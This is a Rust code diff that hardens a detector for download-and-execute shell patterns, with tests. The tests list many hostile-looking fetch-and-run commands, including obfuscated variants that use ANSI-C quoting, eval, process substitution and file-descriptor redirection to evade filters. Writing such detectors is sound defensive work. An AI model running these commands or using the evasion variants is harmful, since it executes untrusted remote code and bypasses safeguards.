@@ -441,6 +441,19 @@ fn is_source_consumer(command: &str) -> bool {
 fn stage_roles(parsed: &ParsedCommand, include_wrapper_shell: bool) -> PipelineRoles {
     let outer = pipeline_stage_head(&parsed.raw).to_ascii_lowercase();
     let inner = parsed.command.to_ascii_lowercase();
+    let executable_word = executable_word(parsed);
+    let decoded_executable = executable_word.as_deref().and_then(|word| {
+        if word.contains("$'") {
+            decode_static_ansi_c_quotes(word)
+        } else {
+            Some(word.to_string())
+        }
+    });
+    let static_head = decoded_executable
+        .as_deref()
+        .map(normalise_static_command_name)
+        .unwrap_or_default()
+        .to_ascii_lowercase();
     let source_consumes_pipe = if is_source_consumer(&outer) {
         let (_, args) = pipeline_stage_parts(&parsed.raw);
         let piped_input = HashMap::from([(0, true)]);
@@ -449,9 +462,12 @@ fn stage_roles(parsed: &ParsedCommand, include_wrapper_shell: bool) -> PipelineR
         false
     };
     PipelineRoles {
-        fetcher: is_pipe_fetcher(&outer) || is_pipe_fetcher(&inner),
+        fetcher: is_pipe_fetcher(&outer)
+            || is_pipe_fetcher(&inner)
+            || is_pipe_fetcher(&static_head),
         shell: is_pipe_shell(&outer)
             || is_pipe_shell(&inner)
+            || is_pipe_shell(&static_head)
             || source_consumes_pipe
             || (include_wrapper_shell
                 && parsed
@@ -460,11 +476,14 @@ fn stage_roles(parsed: &ParsedCommand, include_wrapper_shell: bool) -> PipelineR
                     .any(|wrapper| is_pipe_shell(&wrapper.to_ascii_lowercase()))),
         expansion: contains_unresolved_shell_expansion(&outer)
             || contains_unresolved_shell_expansion(&inner)
-            || executable_has_ansi_c_quote(parsed),
+            || contains_unresolved_shell_expansion(&static_head)
+            || executable_word
+                .as_deref()
+                .is_some_and(|word| word.contains("$'") && decoded_executable.is_none()),
     }
 }
 
-fn executable_has_ansi_c_quote(parsed: &ParsedCommand) -> bool {
+fn executable_word(parsed: &ParsedCommand) -> Option<String> {
     let words = shell_words(&parsed.unwrapped);
     let mut index = 0usize;
     while index < words.len() {
@@ -481,9 +500,96 @@ fn executable_has_ansi_c_quote(parsed: &ParsedCommand) -> bool {
             index += if has_inline_target { 1 } else { 2 };
             continue;
         }
-        return word.contains("$'");
+        return Some(word.clone());
     }
-    false
+    None
+}
+
+fn normalise_static_command_name(word: &str) -> String {
+    let stripped = word.trim().trim_end_matches(['/', '\\']);
+    stripped
+        .rsplit(['/', '\\'])
+        .next()
+        .unwrap_or(stripped)
+        .to_string()
+}
+
+fn decode_static_ansi_c_quotes(text: &str) -> Option<String> {
+    let chars = text.chars().collect::<Vec<_>>();
+    let mut decoded = String::with_capacity(text.len());
+    let mut index = 0usize;
+    let mut saw_quote = false;
+    while index < chars.len() {
+        if chars.get(index..index + 2) != Some(&['$', '\'']) {
+            decoded.push(chars[index]);
+            index += 1;
+            continue;
+        }
+        saw_quote = true;
+        index += 2;
+        let mut closed = false;
+        while index < chars.len() {
+            match chars[index] {
+                '\'' => {
+                    closed = true;
+                    index += 1;
+                    break;
+                }
+                '\\' => {
+                    let (value, next) = decode_ansi_c_escape(&chars, index)?;
+                    decoded.push_str(&value);
+                    index = next;
+                }
+                character => {
+                    decoded.push(character);
+                    index += 1;
+                }
+            }
+        }
+        if !closed {
+            return None;
+        }
+    }
+    saw_quote.then_some(decoded)
+}
+
+fn decode_ansi_c_escape(chars: &[char], slash: usize) -> Option<(String, usize)> {
+    let escaped = *chars.get(slash + 1)?;
+    let simple = match escaped {
+        'a' => Some('\u{0007}'),
+        'b' => Some('\u{0008}'),
+        'e' | 'E' => Some('\u{001b}'),
+        'f' => Some('\u{000c}'),
+        'n' => Some('\n'),
+        'r' => Some('\r'),
+        't' => Some('\t'),
+        'v' => Some('\u{000b}'),
+        '\\' => Some('\\'),
+        '\'' => Some('\''),
+        '"' => Some('"'),
+        _ => None,
+    };
+    if let Some(character) = simple {
+        return Some((character.to_string(), slash + 2));
+    }
+    let (radix, max_digits, digits_start) = match escaped {
+        'x' => (16, 2, slash + 2),
+        'u' => (16, 4, slash + 2),
+        'U' => (16, 8, slash + 2),
+        '0'..='7' => (8, 3, slash + 1),
+        _ => return Some((format!("\\{escaped}"), slash + 2)),
+    };
+    let digits = chars[digits_start..]
+        .iter()
+        .take(max_digits)
+        .take_while(|character| character.is_digit(radix))
+        .collect::<String>();
+    if digits.is_empty() {
+        return Some((escaped.to_string(), slash + 2));
+    }
+    let value = u32::from_str_radix(&digits, radix).ok()?;
+    let character = char::from_u32(value)?;
+    Some((character.to_string(), digits_start + digits.len()))
 }
 
 fn is_shell_assignment_prefix(word: &str) -> bool {
@@ -626,6 +732,7 @@ fn roles_in_ungrouped_stage(stage: &str) -> PipelineRoles {
         .iter()
         .fold(PipelineRoles::default(), |mut roles, command| {
             let mut command_roles = stage_roles(command, true);
+            command_roles.shell |= command_stdout_reaches_process_shell(command);
             if command_routes_stdin_to_process_output(command) {
                 command_roles.shell |= process_output_target_has_shell(&command.raw);
             }
@@ -634,6 +741,13 @@ fn roles_in_ungrouped_stage(stage: &str) -> PipelineRoles {
             roles.expansion |= command_roles.expansion;
             roles
         })
+}
+
+fn command_stdout_reaches_process_shell(command: &ParsedCommand) -> bool {
+    let (_, args) = pipeline_stage_parts(&command.raw);
+    let mut bindings = HashMap::new();
+    apply_output_redirections(&args, &mut bindings);
+    bindings.get(&1).copied().unwrap_or(false)
 }
 
 fn command_routes_stdin_to_process_output(command: &ParsedCommand) -> bool {
@@ -825,7 +939,15 @@ fn persistent_exec_output_reaches_fetcher(
                 }
             }
         }
-        let updates = persistent_exec_descriptor_updates(&parsed.raw);
+        let mut updates = persistent_exec_descriptor_updates(&parsed.raw);
+        if updates.is_empty() {
+            let (head, args) = pipeline_stage_parts(&parsed.raw);
+            if head.eq_ignore_ascii_case("eval")
+                && let Some(decoded) = decode_static_ansi_c_quotes(&args.join(" "))
+            {
+                updates = persistent_exec_descriptor_updates(&decoded);
+            }
+        }
         if !updates.is_empty() {
             for update in updates {
                 let update_is_conditional = conditional || update.conditional;
@@ -845,6 +967,11 @@ fn persistent_exec_output_reaches_fetcher(
             continue;
         }
         let (head, args) = pipeline_stage_parts(&parsed.raw);
+        if pass_through_fetches_input(&head, &args, &descriptor_state.input_bindings)
+            && pipeline_downstream_executes_input(compound, index)
+        {
+            return true;
+        }
         if is_pipe_fetcher(&head.to_ascii_lowercase())
             && fetch_output_reaches_process_shell_with(
                 &head,
@@ -857,6 +984,42 @@ fn persistent_exec_output_reaches_fetcher(
         if execution_consumer_fetches_input(&head, &args, &descriptor_state.input_bindings) {
             return true;
         }
+    }
+    false
+}
+
+fn pipeline_downstream_executes_input(compound: &CompoundCommandResult, index: usize) -> bool {
+    let mut next = index + 1;
+    while next < compound.commands.len()
+        && compound.operators.get(next - 1).map(String::as_str) == Some("|")
+    {
+        let command = &compound.commands[next];
+        if command_executes_bound_input(command, &HashMap::from([(0, true)])) {
+            return true;
+        }
+        if !stage_passes_pipeline_input(&command.raw) {
+            return false;
+        }
+        next += 1;
+    }
+    false
+}
+
+fn pass_through_fetches_input(head: &str, args: &[String], inherited: &HashMap<u32, bool>) -> bool {
+    let head = head.to_ascii_lowercase();
+    if head == "cat" {
+        if process_substitution_is_shell_input_with_mode(args, inherited, true) {
+            return true;
+        }
+        let mut bindings = inherited.clone();
+        apply_input_redirections(args, &mut bindings);
+        return args.iter().any(|argument| argument == "-")
+            && bindings.get(&0).copied().unwrap_or(false);
+    }
+    if head == "tee" {
+        let mut bindings = inherited.clone();
+        apply_input_redirections(args, &mut bindings);
+        return bindings.get(&0).copied().unwrap_or(false);
     }
     false
 }
@@ -1108,7 +1271,12 @@ fn download_exec_in_text(raw: &str) -> bool {
     }
     if is_pipe_shell(&head) {
         if let Some(payload) = shell_command_payload(&args) {
-            return shell_payload_executes_fetch(payload);
+            if shell_payload_executes_fetch(payload) {
+                return true;
+            }
+            let mut input_bindings = HashMap::new();
+            apply_input_redirections(&args, &mut input_bindings);
+            return shell_payload_executes_bound_input(payload, &input_bindings);
         }
         return process_substitution_is_shell_input(&args);
     }
@@ -1118,9 +1286,53 @@ fn download_exec_in_text(raw: &str) -> bool {
     false
 }
 
+fn shell_payload_executes_bound_input(payload: &str, inherited: &HashMap<u32, bool>) -> bool {
+    let mut current = payload.to_string();
+    loop {
+        if let Some(decoded) = decode_static_ansi_c_quotes(&current) {
+            current = decoded;
+        }
+        let compound = parse_compound_command(&current);
+        for (index, command) in compound.commands.iter().enumerate() {
+            if command_executes_bound_input(command, inherited) {
+                return true;
+            }
+            let (head, args) = pipeline_stage_parts(&command.raw);
+            if pass_through_fetches_input(&head, &args, inherited)
+                && pipeline_downstream_executes_input(&compound, index)
+            {
+                return true;
+            }
+        }
+        let (head, args) = pipeline_stage_parts(&current);
+        let head = head.to_ascii_lowercase();
+        let next = if head == "eval" {
+            let args = args.strip_prefix(&["--".to_string()]).unwrap_or(&args);
+            args.join(" ")
+        } else if is_pipe_shell(&head) {
+            let Some(payload) = shell_command_payload(&args) else {
+                return false;
+            };
+            payload.to_string()
+        } else {
+            return false;
+        };
+        if next.len() >= current.len() {
+            return false;
+        }
+        current = next;
+    }
+}
+
 fn shell_payload_executes_fetch(payload: &str) -> bool {
     let mut current = payload.to_string();
     loop {
+        if let Some(decoded) = decode_static_ansi_c_quotes(&current) {
+            if decoded.len() >= current.len() && decoded == current {
+                return false;
+            }
+            current = decoded;
+        }
         if payload_executes_fetch_substitution(&current)
             || matches_pipeline_topology(&parse_compound_command(&current))
         {
@@ -1158,6 +1370,7 @@ fn fetch_output_reaches_process_shell_with(
     let mut bindings = inherited.clone();
     apply_output_redirections(args, &mut bindings);
     bindings.get(&1).copied().unwrap_or(false)
+        || fetch_output_operand_reaches_process_shell(head, args)
         || fetch_output_descriptors(head, args)
             .into_iter()
             .any(|fd| bindings.get(&fd).copied().unwrap_or(false))
@@ -1197,7 +1410,7 @@ fn process_output_target_has_shell(target: &str) -> bool {
     while let Some(current) = pending.pop() {
         for substitution in shell_substitutions(&current) {
             if substitution.kind == SubstitutionKind::ProcessOutput
-                && roles_in_stage_text(&substitution.body).shell
+                && process_output_body_executes_input(&substitution.body)
             {
                 return true;
             }
@@ -1205,6 +1418,114 @@ fn process_output_target_has_shell(target: &str) -> bool {
                 pending.push(substitution.body);
             }
         }
+    }
+    false
+}
+
+fn process_output_body_executes_input(body: &str) -> bool {
+    let stages = top_level_pipeline_stages(body);
+    let stages = if stages.is_empty() {
+        vec![body.trim().to_string()]
+    } else {
+        stages
+    };
+    let mut input_flows = true;
+    for stage in stages {
+        if !input_flows {
+            return false;
+        }
+        let compound = parse_compound_command(&stage);
+        if compound
+            .commands
+            .iter()
+            .any(|command| command_executes_bound_input(command, &HashMap::from([(0, true)])))
+        {
+            return true;
+        }
+        input_flows = stage_passes_pipeline_input(&stage);
+    }
+    false
+}
+
+fn command_executes_bound_input(command: &ParsedCommand, inherited: &HashMap<u32, bool>) -> bool {
+    let roles = stage_roles(command, true);
+    if roles.expansion {
+        return true;
+    }
+    let (head, args) = pipeline_stage_parts(&command.raw);
+    if roles.shell {
+        return process_substitution_is_shell_input_with_mode(&args, inherited, true);
+    }
+    is_source_consumer(&head.to_ascii_lowercase())
+        && process_substitution_is_shell_input_with_mode(&args, inherited, false)
+}
+
+fn stage_passes_pipeline_input(stage: &str) -> bool {
+    let compound = parse_compound_command(stage);
+    compound.commands.iter().any(|command| {
+        let head = stage_roles(command, false);
+        let (raw_head, args) = pipeline_stage_parts(&command.raw);
+        let decoded_head = executable_word(command)
+            .and_then(|word| decode_static_ansi_c_quotes(&word).or(Some(word)))
+            .map_or_else(
+                || raw_head.to_ascii_lowercase(),
+                |word| normalise_static_command_name(&word).to_ascii_lowercase(),
+            );
+        if decoded_head == "tee" {
+            return true;
+        }
+        decoded_head == "cat"
+            && args.iter().all(|argument| {
+                argument.starts_with('-')
+                    || argument == "/dev/stdin"
+                    || argument == "/dev/fd/0"
+                    || redirection_shape(argument).is_some()
+            })
+            && !head.expansion
+    })
+}
+
+fn fetch_output_operand_reaches_process_shell(head: &str, args: &[String]) -> bool {
+    let mut index = 0usize;
+    while index < args.len() {
+        let argument = &args[index];
+        if argument == "--" {
+            break;
+        }
+        let target = match head {
+            "curl" if matches!(argument.as_str(), "-o" | "--output") => {
+                index += 1;
+                args.get(index).map(String::as_str)
+            }
+            "curl" if argument.starts_with("--output=") => {
+                argument.split_once('=').map(|(_, value)| value)
+            }
+            "curl" if argument.starts_with("-o") && argument.len() > 2 => Some(&argument[2..]),
+            "wget" if matches!(argument.as_str(), "-O" | "--output-document") => {
+                index += 1;
+                args.get(index).map(String::as_str)
+            }
+            "wget" if argument.starts_with("--output-document=") => {
+                argument.split_once('=').map(|(_, value)| value)
+            }
+            "wget" if argument.starts_with('-') && !argument.starts_with("--") => {
+                let output = argument.find('O').map(|position| position + 1);
+                output.and_then(|position| {
+                    if position == argument.len() {
+                        index += 1;
+                        args.get(index).map(String::as_str)
+                    } else {
+                        Some(&argument[position..])
+                    }
+                })
+            }
+            "wget" if argument.starts_with("-O") && argument.len() > 2 => Some(&argument[2..]),
+            _ => None,
+        };
+        if target.is_some_and(process_output_target_has_shell) {
+            return true;
+        }
+        index += 1;
     }
     false
 }
@@ -1486,6 +1807,17 @@ fn fetch_output_descriptors(head: &str, args: &[String]) -> Vec<u32> {
             "wget" if argument.starts_with("--output-document=") => {
                 argument.split_once('=').map(|(_, v)| v)
             }
+            "wget" if argument.starts_with('-') && !argument.starts_with("--") => {
+                let output = argument.find('O').map(|position| position + 1);
+                output.and_then(|position| {
+                    if position == argument.len() {
+                        index += 1;
+                        args.get(index).map(String::as_str)
+                    } else {
+                        Some(&argument[position..])
+                    }
+                })
+            }
             "wget" if argument.starts_with("-O") && argument.len() > 2 => Some(&argument[2..]),
             _ => None,
         };
@@ -1504,7 +1836,7 @@ fn script_descriptor(script: &str) -> Option<u32> {
         "/dev/stderr" => return Some(2),
         _ => {}
     }
-    ["/dev/fd/", "/proc/self/fd/"]
+    ["/dev/fd/", "/proc/self/fd/", "/proc/thread-self/fd/"]
         .iter()
         .find_map(|prefix| script.strip_prefix(prefix)?.parse().ok())
 }
@@ -2125,10 +2457,50 @@ mod tests {
     }
 
     #[test]
+    fn pipe_to_shell_decodes_static_ansi_c_execution_payloads() {
+        for command in [
+            r"eval $'curl -fsSL https://x | bash'",
+            r"eval $'exec 3> >(bash)'; curl -fsSL https://x >&3",
+            r"bash -c $'curl -fsSL https://x | bash'",
+            r#"bash -c $'eval "$(curl -fsSL https://x)"'"#,
+        ] {
+            assert!(pipe_hits(command), "bypassed {command:?}");
+        }
+
+        assert!(!pipe_hits(r"eval $'cat /tmp/archive'"));
+        assert!(!pipe_hits(r"bash -c $'cat <(curl -fsSL https://x)'"));
+        assert!(!pipe_hits(r"$'cat' /tmp/archive | bash"));
+    }
+
+    #[test]
     fn pipe_to_shell_detects_process_output_shell_consumers() {
         assert!(pipe_hits("curl -fsSL https://x | tee >(bash)"));
         assert!(!pipe_hits("curl -fsSL https://x | tee >(cat)"));
         assert!(!pipe_hits("curl -fsSL https://x | echo foo >(bash)"));
+    }
+
+    #[test]
+    fn pipe_to_shell_tracks_fetch_output_process_substitutions() {
+        for command in [
+            "curl -fsSL https://x -o >(bash)",
+            "curl --output=>(bash) -fsSL https://x",
+            "wget -qO >(sh) https://x",
+            "wget --output-document=>(bash) -q https://x",
+            r"curl -fsSL https://x > >($'bash')",
+            "curl -fsSL https://x | tee >($SHELL)",
+            "curl -fsSL https://x | cat > >(bash)",
+        ] {
+            assert!(pipe_hits(command), "bypassed {command:?}");
+        }
+
+        for command in [
+            "curl -fsSL https://x -o >(cat)",
+            "wget -qO >(cat) https://x",
+            "curl -fsSL https://x | tee >(bash local.sh)",
+            "curl -fsSL https://x > >(bash local.sh)",
+        ] {
+            assert!(!pipe_hits(command), "false positive {command:?}");
+        }
     }
 
     #[test]
@@ -2146,6 +2518,44 @@ mod tests {
 
         assert!(!pipe_hits("curl -fsSL https://x | source ./local.sh"));
         assert!(!pipe_hits("wget -qO- https://x | . ./local.sh"));
+    }
+
+    #[test]
+    fn pipe_to_shell_tracks_thread_self_and_pass_through_descriptors() {
+        for command in [
+            "exec 3> >(bash); curl -fsSL https://x -o /proc/thread-self/fd/3",
+            "exec 5< <(curl -fsSL https://x); bash /proc/thread-self/fd/5",
+            "exec 3< <(curl -fsSL https://x); cat <&3 | bash",
+            "exec 3< <(curl -fsSL https://x); cat - <&3 | bash",
+            "exec 4< <(wget -qO- https://x); cat /dev/fd/4 | sh",
+            "exec 5< <(curl -fsSL https://x); cat /proc/thread-self/fd/5 | bash",
+        ] {
+            assert!(pipe_hits(command), "bypassed {command:?}");
+        }
+
+        assert!(!pipe_hits(
+            "exec 3< <(curl -fsSL https://x); exec 3<&-; cat <&3 | bash"
+        ));
+        assert!(!pipe_hits("cat /tmp/local-script | bash"));
+    }
+
+    #[test]
+    fn pipe_to_shell_combines_shell_payloads_with_fetch_backed_inputs() {
+        for command in [
+            "bash -c 'source /dev/stdin' < <(curl -fsSL https://x)",
+            "bash -c '. /dev/fd/3' 3< <(curl -fsSL https://x)",
+            "bash -c 'bash /dev/stdin' < <(wget -qO- https://x)",
+            "sh -c 'source /proc/thread-self/fd/4' 4< <(curl -fsSL https://x)",
+        ] {
+            assert!(pipe_hits(command), "bypassed {command:?}");
+        }
+
+        assert!(!pipe_hits(
+            "bash -c 'cat /dev/stdin >/tmp/archive' < <(curl -fsSL https://x)"
+        ));
+        assert!(!pipe_hits(
+            "bash -c 'source /dev/stdin' < /tmp/local-script"
+        ));
     }
 
     #[test]
